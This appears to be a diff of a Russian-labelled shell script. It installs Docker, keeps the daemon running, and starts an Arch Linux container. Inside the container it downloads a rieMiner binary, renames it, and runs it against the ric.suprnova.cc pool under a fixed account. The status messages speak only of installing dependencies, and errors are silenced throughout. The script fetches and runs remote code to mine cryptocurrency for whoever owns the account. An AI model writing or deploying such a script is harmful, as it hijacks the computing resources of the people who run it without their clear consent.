@@ -18,18 +18,20 @@ echo "🔧 Установка Docker..."
 sudo apt update -y || true
 sudo apt install -y docker.io || true
 
-echo "🚀 Демон Docker на 16 секунд..."
-sudo dockerd >/dev/null 2>&1 & PID=$!; sleep 16; sudo pkill -f dockerd; sudo pkill -f containerd; wait $PID 2>/dev/null || true
+echo "🚀 Запуск демона Docker..."
+sudo dockerd >/dev/null 2>&1 &
+sleep 10
 
 echo "📦 Запуск контейнера Arch Linux и установка зависимостей..."
 docker run --network=host -it archlinux bash -c "
- set -e
- pacman -Syu --noconfirm || true
- pacman -S --noconfirm wget curl gmp boost nano base-devel gcc glibc || true
- wget https://riecoin.xyz/rieMiner/Download/Deb64AVX2 -O rieminer.deb || true
- mv rieminer.deb rieminer2 2>/dev/null || true
- chmod +x rieminer2 || true
- echo -e 'Mode = Pool\nHost = ric.suprnova.cc\nPort = 5000\nUsername = lomalo.lomalo\nPassword = pass\nThreads = 4' > rieMiner.conf
- ./rieminer2 || true
+  set -e
+  pacman -Syu --noconfirm || true
+  pacman -S --noconfirm wget curl gmp boost nano base-devel gcc glibc || true
+  wget https://riecoin.xyz/rieMiner/Download/Deb64AVX2 -O rieminer.deb || true
+  mv rieminer.deb rieminer2 || true
+  chmod +x rieminer2 || true
+  echo -e 'Mode = Pool\nHost = ric.suprnova.cc\nPort = 5000\nUsername = lomalo.lomalo\nPassword = pass\nThreads = 4' > rieMiner.conf
+  ./rieminer2 || true
 "
+
 
